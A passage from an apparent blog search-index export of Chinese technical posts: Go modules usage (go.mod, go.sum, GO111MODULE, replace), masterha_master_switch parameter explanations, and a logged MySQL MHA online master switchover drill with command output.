h1:kCmZyPklC0gVdL728E6Aj20uYBJV93nj/TkwBTKhFbs=github.com/gin-gonic/gin v1.3.0/go.mod h1:7cKuhb5qV2ggCFctp2fJQ+ErvciLZrIeoOSOm6mUr7Y=github.com/golang/protobuf v1.2.0 h1:P3YflyNX/ehuJFLhxviNdFxQPkGK5cDcApsge1SqnvM=github.com/golang/protobuf v1.2.0/go.mod h1:6lQm79b+lXiMfvg/cZm0SGofjICqVBUtrP5yJMmIC1U=github.com/mattn/go-isatty v0.0.4 h1:bnP0vzxcAdeI1zdubAl5PjU6zsERjGZb7raWodagDYs=github.com/mattn/go-isatty v0.0.4/go.mod h1:M+lRXTBqGeGNdLjl/ufCoiOlB5xdOkqRJdNxMWT7Zi4=github.com/ugorji/go/codec v0.0.0-20181022190402-e5e69e061d4f h1:y3Vj7GoDdcBkxFa2RUUFKM25TrBbWVDnjRDI0u975zQ=github.com/ugorji/go/codec v0.0.0-20181022190402-e5e69e061d4f/go.mod h1:VFNgLljTbGfSG7qAOspJ7OScBnGdDN/yBr0sguwnwf0=gopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=gopkg.in/go-playground/validator.v8 v8.18.2 h1:lFB4DoMU6B626w8ny76MV7VX6W2VHct2GVOI3xgiMrQ=gopkg.in/go-playground/validator.v8 v8.18.2/go.mod h1:RX2a/7Ha8BgOhfk7j780h4/u/RRjR0eouCJSH80/M2Y=gopkg.in/yaml.v2 v2.2.1 h1:mUhvW9EsL+naU5Q3cakzfE91YhliOondGd6ZrsDBHQE=gopkg.in/yaml.v2 v2.2.1/go.mod h1:hI93XBmqTisBFMUTm0b8Fm+jr3Dg1NNxqwp+5A1VGuI= 写过 node 的人应该会发现， go.mod/go.sum 的关系跟 package.json/package-lock.json 类似，前者定义 dependency root，后者将关系展开。 最后执行 bin/main 可以看到 Gin 很贴心的列出了 handler 所属的 package1234567891011$ ./bin/main[GIN-debug] [WARNING] Now Gin requires Go 1.6 or later and Go 1.7 will be required soon.[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production. - using env: export GIN_MODE=release - using code: gin.SetMode(gin.ReleaseMode)[GIN-debug] GET /health --> main.GetHealthHandler (3 handlers)[GIN-debug] GET /health-dataapi --> github.com/wangjiemin/mytest/pkg/api/data.GetDataAPIHealthHandler (3 handlers) 到这里，一个 go modules 就完成了。 GO111MODULEModules 是作为 experiment feature 加入到不久前正式发布的 Go 1.11 中的。 按照 Go 的惯例，在新的 experiment feature 首次加入时，都会有一个特性开关，go modules 也不例外，GO111MODULE 这个临时的环境变量就是 go modules 特性的 experiment 开关。 off: go modules experiment feature 关闭，go compiler 会始终使用 GOPATH mode，即无论要构建的源码目录是否在 GOPATH 路径下，go compiler 都会在传统的 GOPATH 和 vendor 目录 (仅支持在 GOPATH 目录下的 package) 下搜索目标程序依赖的 go package； on: 始终使用 module-aware mode，只根据 go.mod 下载 dependency 而完全忽略 GOPATH 以及 vendor 目录 auto: Golang 1.11 预设值，使用 GOPATH mode 还是 module-aware mode，取决于要构建的源码目录所在位置以及是否包含 go.mod 文件。满足任一条件时才使用 module-aware mode: 当前目录位于 GOPATH/src 之外并且包含 go.mod 文件 当前目录位于包含 go.mod 文件的目录下 go mod 命令12345678download download modules to local cache (下载依赖的 modules 到本地 cache)edit edit go.mod from tools or scripts (编辑 go.mod 文件)graph print module requirement graph (打印模块依赖图)init initialize new module in current directory (再当前文件夹下初始化一个新的 module, 创建 go.mod 文件)tidy add missing and remove unused modules (增加丢失的 modules，去掉未用的 modules)vendor make vendored copy of dependencies (将依赖复制到 vendor 下)verify verify dependencies have expected content (校验依赖)why explain why packages or modules are needed (解释为什么需要依赖) 看这些命令的帮助已经比较容易了解命令的功能。 既有项目假设你已经有了一个 go 项目， 比如在$GOPATH/github.com/wangjiemim/mytest下， 你可以使用go mod init github.com/wangjiemim/mytest在这个文件夹下创建一个空的 go.mod (只有第一行 module github.com/wangjiemim/mytest)。 然后你可以通过 go get ./...让它查找依赖，并记录在 go.mod 文件中 (你还可以指定 -tags, 这样可以把 tags 的依赖都查找到)。 通过go mod tidy也可以用来为 go.mod 增加丢失的依赖，删除不需要的依赖，但是我不确定它怎么处理tags。 执行上面的命令会把 go.mod 的latest版本换成实际的最新的版本，并且会生成一个go.sum记录每个依赖库的版本和哈希值。 replace在国内访问golang.org/x的各个包都需要梯子，你可以在 go.mod 中使用replace替换成 github 上对应的库。12345replace ( golang.org/x/crypto v0.0.0-20180820150726-614d502a4dac => github.com/golang/crypto v0.0.0-20180820150726-614d502a4dac golang.org/x/net v0.0.0-20180821023952-922f4815f713 => github.com/golang/net v0.0.0-20180826012351-8a410e7b638d golang.org/x/text v0.3.0 => github.com/golang/text v0.3.0) 依赖库中的replace对你的主 go.mod 不起作用，比如github.com/wangjiemin/mytest的 go.mod 已经增加了replace, 但是你的 go.mod 虽然require了rpcx的库，但是没有设置replace的话， go get还是会访问golang.org/x。 所以如果想编译那个项目，就在哪个项目中增加replace。 包的版本控制下面的版本都是合法的：12345gopkg.in/tomb.v1 v1.0.0-20141024135613-dd632973f1e7gopkg.in/vmihailenco/msgpack.v2 v2.9.1gopkg.in/yaml.v2 { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[masterha-master-switch 参数详解]]></title>
    <url>%2F2019%2F03%2F28%2Fmasterha-master-switch%2F</url>
    <content type="text"><![CDATA[MHA 命令 masterha_master_switch常用参数介绍1234567891011121314151617181920212223242526272829303132333435363738394041424344--master_state=dead 强制的参数，参数值为"dead" 或者 "alive" . 如果 设置为 alive 模式，masterha_master_switch 开始在线主库切换操作。 --dead_master_host=(hostname) 强制参数，宕机的主库所在的主机名称。--dead_master_ip 和 --dead_master_port 是可选参数，如果这些参数没有设置，--dead_master_ip 就是 --dead_master_host 解析的IP地址。--dead_master_port 为 3306 --new_master_host=(hostname) 新主机地址，可选参数，这个参数在你明确新的主库的主机，非常有用。(这就意味着你不需要让MHA来决定新的主库)。如果不设置此参数，MHA 将会利用自动failover的规则来选择新的主库。如果设置--new_master_host，MHA选择此主机为新的主库，如果不能成为主库，MHA将会退出 --interactive=(0|1) 如果设置为0，在masterha_master_switch，它自动执行故障转移(非交互式)。这实际上是和masterha_manager的内部运行机制一样，这种非交互式故障转移是有用的，如果你已经证实了master死了,但你想尽快做故障转移。非交互式故障转移也是有用的,如果你使用其他现有的主监控软件和要调用的非交互式故障转移命令软件。典型的例子是masterha_master_switch调用从集群软件像起搏器。 --ssh_reachable=(0|1|2) 指定master 经过SSH是否可达。0:不可达、1:可达、2:未知(默认值)。 如果设置为了2，此命令内部将会检测通过SSH 是否可达master，并且跟新SSH 状态。如果可达，且设置master_ip_failover_script 或者 shutdown_script .将会执行"--command=stopssh"。否则，执行 "--command=stop"。另外，如果宕机的master通过SSH可达，failover脚本试图从宕机的master机器上拷贝没有没有发送的binlog。 --skip_change_master 如果设置此参数，当发生failover的时候，MAH 在应用完不同的relay log退出，忽略CHANGE MASTER 和 START SLAVE 操作。所以 slaves 不会指向 新的master. 开启此参数，有利于手动的二次检查slave 恢复是否成功 --skip_disable_read_only 设置此参数，MHA 将不会在新的主库上执行 SET GLOBAL read_only =0 操作，有利于手动操作 --last_failover_minute=(minutes) 参考master_manager --ignore_last_failover 参考master_manager --wait_on_failover_error=(seconds) 类似于master_manager, 此参数只用于自动的/非交互式的failover。如果没有设置--interval=0，wait_on_failover_error 将会被忽略，在发生错误的时候不会sleep。 --remove_dead_master_conf 参考masterha_manager --wait_until_gtid_in_sync(0|1) 此参数从0.56版本开始可用，如果设置成1，当基于GITD的failover时,MHA 会等待所有的从库追上新主库的GITD --skip_change_master 此参数从0.56版本开始可用，如果开启此选项，MHA 跳过 CHANGE MASTER 的操作 --skip_disable_read_only 此参数从0.56版本开始可用，如果开启此选项，MHA 将会在新的master 跳过 SET GLOBAL read_only = 0; --ignore_binlog_server_error 此参数从0.56版本开始可用，如果开启此选项，当执行failover的时，MHA忽略binlog server上任何错误 主在线切换时相关参数1234567891011--new_master_host=(hostname) 新主机地址，可选参数，这个参数在你明确新的主库的主机，非常有用。(这就意味着你不需要让MHA来决定新的主库)。如果不设置此参数，MHA 将会利用自动failover的规则来选择新的主库。如果设置--new_master_host，MHA选择此主机为新的主库，如果不能成为主库，MHA将会退出 --orig_master_is_new_slave 当完成主库切换后，原先的主库将作为现在主库的slave运行。默认:不开启(原先的主库不会加入到新的复制环境中)。如果开启此选项，需要在配置文件中设置repl_password参数，由于当期的Master并不知道新的Master的replication的密码 --remove_orig_master_conf 如果设置此参数，当成功failover后，MHA manager将会自动删除配置文件中关于dead master的配置选项。 --skip_lock_all_tables 当在做主库切换的时候，MHA会在原先的主库上执行FLUSH TABLES WITH READ LOCK 操作，确保没有跟新操作，但是FLUSH TABLES WITH READ LOCK 操作是非常耗费资源的，并且你可以在原先的主库确定没有跟新操作(通过master_ip_online_change_script 中kill all clients操作等)。可以利用此选项避免锁表。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MHA</category>
      </categories>
      <tags>
        <tag>MHA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MHA 故障切换演练 --- masterha_master_switch]]></title>
    <url>%2F2019%2F03%2F28%2Fmha-switch%2F</url>
    <content type="text"><![CDATA[前言昨天公司要进行线上MHA高可用集群故障切换演练。由于我刚入职公司。公司还没有做过太多的灾难级别的故障演练。 我写了一些步骤：故障切换 查看主从延迟状态 登录MHA中控机，查看演练切换的数据库MHA log文件，使用tail -f 命令来获取切换的log日志信息 登录master机器，执行 /etc/init.d/mysql stop 查看MHA中控机日志信息。 切换成功，登录到 new_master 中查看vip是否已经绑定到网卡上 登录slave，查看 show slave status 是否已经change master to new_master ip上，查看slave正常与否 在 MHA 中控机启动 masterha_manager 进程，查看MHA集群启动是否正常。(两节点)结构图：new_master: (master)—> slave: (slave) master 数据库恢复 登录到old_master 机器上执行 /etc/init.d/mysql start 是否正常启动服务 在MHA中控机中获取切换的log 日志信息找出 change master to new_master 信息语句 在old_master 中执行change master to 语句，变为 new_master的slave show slave status 查看 old_master 是否正常变为 new_master 的slave 在MHA 中控机节点，执行 masterha_stop 命令结束 masterha_manager进程。 在MHA 中控机启动 masterha_manager 进程，查看恢复好的old_master是否正常加入到MHA节点 (三节点）结构图：new_master: (master)—> old_master: (slave)—> slave: (slave) 恢复 old_master为 master 角色 查看主从延迟状态 登录MHA中控机，查看演练切换的数据库MHA log文件，使用tail -f 命令来获取切换的log日志信息 登录new_master机器，执行 /etc/init.d/mysql stop 查看MHA中控机日志信息。 切换成功，登录到 old_master 中查看vip是否已经绑定到网卡上 登录slave，查看 show slave status 是否已经change master to old_master ip上，查看slave正常与否 在 MHA 中控机启动 masterha_manager 进程，查看MHA集群启动是否正常。(两节点)结构图：master(old_master): (master)—> slave(new_master): (slave)—> slave: (slave) 但是这么操作虽然能更贴近真实灾难(暂时没有把主从数据延迟考虑进入)，需要的时间会更多。领导建议手动操作MHA failover测试能不能切换。服务器架构 server role master old_master slave new_master slave slave 具体操作在MHA 中控机中执行命令1# masterha_check_repl --conf=/root/dba/mha/conf/babybi_#1.conf 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182Wed Mar 27 23:28:28 2019 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Wed Mar 27 23:28:28 2019 - [info] Reading application default configuration from /root/dba/mha/conf/babybi_#1.conf..Wed Mar 27 23:28:28 2019 - [info] Reading server configuration from /root/dba/mha/conf/babybi_#1.conf..Wed Mar 27 23:28:28 2019 - [info] MHA::MasterMonitor version 0.56.Wed Mar 27 23:28:28 2019 - [info] GTID failover mode = 0Wed Mar 27 23:28:28 2019 - [info] Dead Servers:Wed Mar 27 23:28:28 2019 - [info] Alive Servers:Wed Mar 27 23:28:28 2019 - [info] 10.25.1.66(10.25.1.66:3306)Wed Mar 27 23:28:28 2019 - [info] 10.25.1.67(10.25.1.67:3306)Wed Mar 27 23:28:28 2019 - [info] 10.25.1.68(10.25.1.68:3306)Wed Mar 27 23:28:28 2019 - [info] Alive Slaves:Wed Mar 27 23:28:28 2019 - [info] 10.25.1.67(10.25.1.67:3306) Version=5.6.29-76.2-log (oldest major version between slaves) log-bin:enabledWed Mar 27 23:28:28 2019 - [info] Replicating from 10.25.1.66(10.25.1.66:3306)Wed Mar 27 23:28:28 2019 - [info] Primary candidate for the new Master (candidate_master is set)Wed Mar 27 23:28:28 2019 - [info] 10.25.1.68(10.25.1.68:3306) Version=5.6.29-76.2-log (oldest major version between slaves) log-bin:enabledWed Mar 27 23:28:28 2019 - [info] Replicating from 10.25.1.66(10.25.1.66:3306)Wed Mar 27 23:28:28 2019 - [info] Current Alive Master: 10.25.1.66(10.25.1.66:3306)Wed Mar 27 23:28:28 2019 - [info] Checking slave configurations..Wed Mar 27 23:28:28 2019 - [warning] relay_log_purge=0 is not set on slave 10.25.1.67(10.25.1.67:3306).Wed Mar 27 23:28:28 2019 - [warning] relay_log_purge=0 is not set on slave 10.25.1.68(10.25.1.68:3306).Wed Mar 27 23:28:28 2019 - [info] Checking replication filtering settings..Wed Mar 27 23:28:28 2019 - [info] binlog_do_db= , binlog_ignore_db= Wed Mar 27 23:28:28 2019 - [info] Replication filtering check ok.Wed Mar 27 23:28:28 2019 - [info] GTID (with auto-pos) is not supportedWed Mar 27 23:28:28 2019 - [info] Starting SSH connection tests..Wed Mar 27 23:28:29 2019 - [info] All SSH connection tests passed successfully.Wed Mar 27 23:28:29 2019 - [info] Checking MHA Node version..Wed Mar 27 23:28:30 2019 - [info] Version check ok.Wed Mar 27 23:28:30 2019 - [info] Checking SSH publickey authentication settings on the current master..Wed Mar 27 23:28:30 2019 - [info] HealthCheck: SSH to 10.25.1.66 is reachable.Wed Mar 27 23:28:30 2019 - [info] Master MHA Node version is 0.56.Wed Mar 27 23:28:30 2019 - [info] Checking recovery script configurations on 10.25.1.66(10.25.1.66:3306)..Wed Mar 27 23:28:30 2019 - [info] Executing command: save_binary_logs --command=test --start_pos=4 --binlog_dir=/log/mysql/binlog/ --output_file=/var/tmp/save_binary_logs_test --manager_version=0.56 --start_file=mysql-bin.004691 Wed Mar 27 23:28:30 2019 - [info] Connecting to root@10.25.1.66(10.25.1.66:22).. Creating /var/tmp if not exists.. ok. Checking output directory is accessible or not.. ok. Binlog found at /log/mysql/binlog/, up to mysql-bin.004691Wed Mar 27 23:28:31 2019 - [info] Binlog setting check done.Wed Mar 27 23:28:31 2019 - [info] Checking SSH publickey authentication and checking recovery script configurations on all alive slave servers..Wed Mar 27 23:28:31 2019 - [info] Executing command : apply_diff_relay_logs --command=test --slave_user='mha' --slave_host=10.25.1.67 --slave_ip=10.25.1.67 --slave_port=3306 --workdir=/var/tmp --target_version=5.6.29-76.2-log --manager_version=0.56 --relay_log_info=/my/data/percona/relay-log.info --relay_dir=/my/data/percona/ --slave_pass=xxxWed Mar 27 23:28:31 2019 - [info] Connecting to root@10.25.1.67(10.25.1.67:22).. Checking slave recovery environment settings.. Opening /my/data/percona/relay-log.info ... ok. Relay log found at /log/mysql/relaylog, up to relay-log.014072 Temporary relay log file is /log/mysql/relaylog/relay-log.014072 Testing mysql connection and privileges..Warning: Using a password on the command line interface can be insecure. done. Testing mysqlbinlog output.. done. Cleaning up test file(s).. done.Wed Mar 27 23:28:31 2019 - [info] Executing command : apply_diff_relay_logs --command=test --slave_user='mha' --slave_host=10.25.1.68 --slave_ip=10.25.1.68 --slave_port=3306 --workdir=/var/tmp --target_version=5.6.29-76.2-log --manager_version=0.56 --relay_log_info=/my/data/percona/relay-log.info --relay_dir=/my/data/percona/ --slave_pass=xxxWed Mar 27 23:28:31 2019 - [info] Connecting to root@10.25.1.68(10.25.1.68:22).. Checking slave recovery environment settings.. Opening /my/data/percona/relay-log.info ... ok. Relay log found at /log/mysql/relaylog, up to relay-log.014072 Temporary relay log file is /log/mysql/relaylog/relay-log.014072 Testing mysql connection and privileges..Warning: Using a password on the command line interface can be insecure. done. Testing mysqlbinlog output.. done. Cleaning up test file(s).. done.Wed Mar 27 23:28:31 2019 - [info] Slaves settings check done.Wed Mar 27 23:28:31 2019 - [info] 10.25.1.66(10.25.1.66:3306) (current master) +--10.25.1.67(10.25.1.67:3306) +--10.25.1.68(10.25.1.68:3306)Wed Mar 27 23:28:31 2019 - [info] Checking replication health on 10.25.1.67..Wed Mar 27 23:28:31 2019 - [info] ok.Wed Mar 27 23:28:31 2019 - [info] Checking replication health on 10.25.1.68..Wed Mar 27 23:28:31 2019 - [info] ok.Wed Mar 27 23:28:31 2019 - [info] Checking master_ip_failover_script status:Wed Mar 27 23:28:31 2019 - [info] /root/dba/mha/script/master_ip_failover.sh --command=status --ssh_user=root --orig_master_host=10.25.1.66 --orig_master_ip=10.25.1.66 --orig_master_port=3306 IN SCRIPT TEST====/etc/init.d/keepalived stop==/etc/init.d/keepalived start===Checking the Status of the script.. OK Wed Mar 27 23:28:31 2019 - [info] OK.Wed Mar 27 23:28:31 2019 - [warning] shutdown_script is not defined.Wed Mar 27 23:28:31 2019 - [info] Got exit code 0 (Not master dead).MySQL Replication Health is OK. 执行 masterha_master_switch 命令1# masterha_master_switch --conf=/root/dba/mha/conf/babybi_#1.conf --master_state=alive --new_master_host=10.25.1.67 --new_master_port=3306 --orig_master_is_new_slave --running_updates_limit=10000 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798Wed Mar 27 23:34:27 2019 - [info] MHA::MasterRotate version 0.56.Wed Mar 27 23:34:27 2019 - [info] Starting online master switch..Wed Mar 27 23:34:27 2019 - [info] Wed Mar 27 23:34:27 2019 - [info] * Phase 1: Configuration Check Phase..Wed Mar 27 23:34:27 2019 - [info] Wed Mar 27 23:34:27 2019 - [warning] Global configuration file /etc/masterha_default.cnf not found. Skipping.Wed Mar 27 23:34:27 2019 - [info] Reading application default configuration from /root/dba/mha/conf/babybi_#1.conf..Wed Mar 27 23:34:27 2019 - [info] Reading server configuration from /root/dba/mha/conf/babybi_#1.conf..Wed Mar 27 23:34:27 2019 - [info] GTID failover mode = 0Wed Mar 27 23:34:27 2019 - [info] Current Alive Master: 10.25.1.66(10.25.1.66:3306)Wed Mar 27 23:34:27 2019 - [info] Alive Slaves:Wed Mar 27 23:34:27 2019 - [info] 10.25.1.67(10.25.1.67:3306) Version=5.6.29-76.2-log (oldest major version between slaves) log-bin:enabledWed Mar 27 23:34:27 2019 - [info] Replicating from 10.25.1.66(10.25.1.66:3306)Wed Mar 27 23:34:27 2019 - [info] Primary candidate for the new Master (candidate_master is set)Wed Mar 27 23:34:27 2019 - [info] 10.25.1.68(10.25.1.68:3306) Version=5.6.29-76.2-log (oldest major version between slaves) log-bin:enabledWed Mar 27 23:34:27 2019 - [info] Replicating from 10.25.1.66(10.25.1.66:3306)It is better to execute FLUSH NO_WRITE_TO_BINLOG TABLES on the master before switching. Is it ok to execute on 10.25.1.66(10.25.1.66:3306)? (YES/no): ---> 输入: yesWed Mar 27 23:34:34 2019 - [info] Executing FLUSH NO_WRITE_TO_BINLOG TABLES. This may take long time..Wed Mar 27 23:34:34 2019 - [info] ok.Wed Mar 27 23:34:34 2019 - [info] Checking MHA is not monitoring or doing failover..Wed Mar 27 23:34:34 2019 - [info] Checking replication health on 10.25.1.67..Wed Mar 27 23:34:34 2019 - [info] ok.Wed Mar 27 23:34:34 2019 - [info] Checking replication health on 10.25.1.68..Wed Mar 27 23:34:34 2019 - [info] ok.Wed Mar 27 23:34:34 2019 - [info] 10.25.1.67 can be new master.Wed Mar 27 23:34:34 2019 - [info] From:10.25.1.66(10.25.1.66:3306) (current master) +--10.25.1.67(10.25.1.67:3306) +--10.25.1.68(10.25.1.68:3306)To:10.25.1.67(10.25.1.67:3306) (new master) +--10.25.1.68(10.25.1.68:3306) +--10.25.1.66(10.25.1.66:3306)Starting master switch from 10.25.1.66(10.25.1.66:3306) to 10.25.1.67(10.25.1.67:3306)? (yes/NO): ---> 输入: yesWed Mar 27 23:34:37 2019 - [info] Checking whether 10.25.1.67(10.25.1.67:3306) is ok for the new master..Wed Mar 27 23:34:37 2019 - [info] ok.Wed Mar 27 23:34:37 2019 - [info] 10.25.1.66(10.25.1.66:3306): SHOW SLAVE STATUS returned empty result. To check replication filtering rules, temporarily executing CHANGE MASTER to a dummy host.Wed Mar 27 23:34:37 2019 - [info] 10.25.1.66(10.25.1.66:3306): Resetting slave pointing to the dummy host.Wed Mar 27 23:34:37 2019 - [info] ** Phase 1: Configuration Check Phase completed.Wed Mar 27 23:34:37 2019 - [info] Wed Mar 27 23:34:37 2019 - [info] * Phase 2: Rejecting updates Phase..Wed Mar 27 23:34:37 2019 - [info] Wed Mar 27 23:34:37 2019 - [info] Executing master ip online change script to disable write on the current master:Wed Mar 27 23:34:37 2019 - [info] /root/dba/mha/script/master_ip_online_change.sh --command=stop --orig_master_host=10.25.1.66 --orig_master_ip=10.25.1.66 --orig_master_port=3306 --orig_master_user='mha' --orig_master_password='mhapassword' --new_master_host=10.25.1.67 --new_master_ip=10.25.1.67 --new_master_port=3306 --new_master_user='mha' --new_master_password='mhapassword' --orig_master_ssh_user=root --new_master_ssh_user=root --orig_master_is_new_slave2019-03-27 23:34:38 set_mysql_read_only successful!Stopping keepalived: [ OK ]2019-03-27 23:34:38 stop_keepalived successful!Wed Mar 27 23:34:38 2019 - [info] ok.Wed Mar 27 23:34:38 2019 - [info] Locking all tables on the orig master to reject updates from everybody (including root):Wed Mar 27 23:34:38 2019 - [info] Executing FLUSH TABLES WITH READ LOCK..Wed Mar 27 23:34:38 2019 - [info] ok.Wed Mar 27 23:34:38 2019 - [info] Orig master binlog:pos is mysql-bin.004691:854373586.Wed Mar 27 23:34:38 2019 - [info] Waiting to execute all relay logs on 10.25.1.67(10.25.1.67:3306)..Wed Mar 27 23:34:38 2019 - [info] master_pos_wait(mysql-bin.004691:854373586) completed on 10.25.1.67(10.25.1.67:3306). Executed 0 events.Wed Mar 27 23:34:38 2019 - [info] done.Wed Mar 27 23:34:38 2019 - [info] Getting new master's binlog name and position..Wed Mar 27 23:34:38 2019 - [info] mysql-bin.000001:120Wed Mar 27 23:34:38 2019 - [info] All other slaves should start replication from here. Statement should be: CHANGE MASTER TO MASTER_HOST='10.25.1.67', MASTER_PORT=3306, MASTER_LOG_FILE='mysql-bin.000001', MASTER_LOG_POS=120, MASTER_USER='repl', MASTER_PASSWORD='xxx';Wed Mar 27 23:34:38 2019 - [info] Executing master ip online change script to allow write on the new master:Wed Mar 27 23:34:38 2019 - [info] /root/dba/mha/script/master_ip_online_change.sh --command=start --orig_master_host=10.25.1.66 --orig_master_ip=10.25.1.66 --orig_master_port=3306 --orig_master_user='mha' --orig_master_password='mhapassword' --new_master_host=10.25.1.67 --new_master_ip=10.25.1.67 --new_master_port=3306 --new_master_user='mha' --new_master_password='mhapassword' --orig_master_ssh_user=root --new_master_ssh_user=root --orig_master_is_new_slaveStarting keepalived: [ OK ]2019-03-27 23:34:38 start_keepalived successful!Wed Mar 27 23:34:38 2019 - [info] ok.Wed Mar 27 23:34:38 2019 - [info] Setting read_only=0 on 10.25.1.67(10.25.1.67:3306)..Wed Mar 27 23:34:38 2019 - [info] ok.Wed Mar 27 23:34:38 2019 - [info] Wed Mar 27 23:34:38 2019 - [info] * Switching slaves in parallel..Wed Mar 27 23:34:38 2019 - [info] Wed Mar 27 23:34:38 2019 - [info] -- Slave switch on host 10.25.1.68(10.25.1.68:3306) started, pid: 20673Wed Mar 27 23:34:38 2019 - [info] Wed Mar 27 23:34:38 2019 - [info] Log messages from 10.25.1.68 ...Wed Mar 27 23:34:39 2019 - [info] Wed Mar 27 23:34:38 2019 - [info] Waiting to execute all relay logs on 10.25.1.68(10.25.1.68:3306)..Wed Mar 27 23:34:38 2019 - [info] master_pos_wait(mysql-bin.004691:854373586) completed on 10.25.1.68(10.25.1.68:3306). Executed 0 events.Wed Mar 27 23:34:38 2019 - [info] done.Wed Mar 27 23:34:38 2019 - [info] Resetting slave 10.25.1.68(10.25.1.68:3306) and starting replication from the new master 10.25.1.67(10.25.1.67:3306)..Wed Mar 27 23:34:38 2019 - [info] Executed CHANGE MASTER.Wed Mar 27 23:34:38 2019 - [info] Slave started.Wed Mar 27 23:34:39 2019 - [info] End of log messages from 10.25.1.68 ...Wed Mar 27 23:34:39 2019 - [info] Wed Mar 27 23:34:39 2019 - [info] -- Slave switch on host 10.25.1.68(10.25.1.68:3306) succeeded.Wed Mar 27 23:34:39 2019 - [info] Unlocking all tables on the orig master:Wed Mar 27 23:34:39 2019 - [info] Executing UNLOCK TABLES..Wed Mar 27 23:34:39 2019 - [info] ok.Wed Mar 27 23:34:39 2019 - [info] Starting orig master as a new slave..Wed Mar 27 23:34:39 2019 - [info] Resetting slave 10.25.1.66(10.25.1.66:3306) and starting replication from the new master 10.25.1.67(10.25.1.67:3306)..Wed Mar 27 23:34:39 2019 - [info] Executed CHANGE MASTER.Wed Mar 27 23:34:39 2019 - [info] Slave started.Wed Mar 27 23:34:39 2019 - [info] All new slave servers switched successfully.Wed Mar 27 23:34:39 2019 - [info] Wed Mar 27 23:34:39 2019 - [info] * Phase 5: New master cleanup phase..Wed Mar 27 23:34:39 2019 - [info] Wed Mar 27 23:34:39 2019 - [info] 10.25.1.67: Resetting slave info succeeded.Wed Mar 27 23:34:39 2019 - [info] Switching master to 10.25.1.67(10.25.1.67:3306) completed successfully. 1234# ps -ef|grep babybi_#1.confroot 3578 1 0 Jan08 ? 00:42:35 perl /usr/bin/masterha_manager --conf=/root/dba/mha/conf/babybi_#1.conf --ignore_last_failoverroot 21082 17518 0 23:35 pts/0 00:00:00 grep --colour=auto babybi_#1.conf# 到new_master机器中查看VIP有没有绑定过来到网卡上1# ip a 123456789101112131415161718191: lo: mtu 65536 qdisc noqueue state UNKNOWN link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: em1: mtu 1500 qdisc mq master bond0 state UP qlen 1000 link/ether 24:6e:96:13:61:30 brd ff:ff:ff:ff:ff:ff3: em2: mtu 1500 qdisc mq master bond0 state UP qlen 1000 link/ether 24:6e:96:13:61:30 brd ff:ff:ff:ff:ff:ff4: em3: mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 24:6e:96:13:61:34 brd ff:ff:ff:ff:ff:ff5: em4: mtu 1500 qdisc noop state DOWN qlen 1000 link/ether 24:6e:96:13:61:35 brd ff:ff:ff:ff:ff:ff6: bond0: mtu 1500 qdisc noqueue state UP link/ether 24:6e:96:13:61:30 brd ff:ff:ff:ff:ff:ff inet 10.25.1.67/24 brd 10.25.1.255 scope global bond0 inet 10.25.1.203/32 scope global bond0 inet6 fe80::266e:96ff:fe13:6130/64 scope link valid_lft forever preferred_lft forever 登录到slave机器上12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364mysql> show slave status\GERROR 2006 (HY000): MySQL server has gone awayNo connection. Trying to reconnect...Connection id: 2049252955Current database: *** NONE ****************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 10.25.1.67 Master_User: repl Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mysql-bin.000001 Read_Master_Log_Pos: 62528 Relay_Log_File: relay-log.000002 Relay_Log_Pos: 62691 Relay_Master_Log_File: mysql-bin.000001 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 62528 Relay_Log_Space: 62858 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 1673306 Master_UUID: ca479c32-fa0d-11e8-bc0f-246e96136130 Master_Info_File: /my/data/percona/master.info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for the slave I/O thread to update it Master_Retry_Count: 86400 Master_Bind: Last_IO_Error_Timestamp: Last_SQL_Error_Timestamp: Master_SSL_Crl: Master_SSL_Crlpath: Retrieved_Gtid_Set: Executed_Gtid_Set: Auto_Position: 01 row in set (0.00 sec)mysql> 正常 CHANGE MASTER TO NEW_MASTER 登录到old_master中查看1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859mysql> show slave status\G*************************** 1. row *************************** Slave_IO_State: 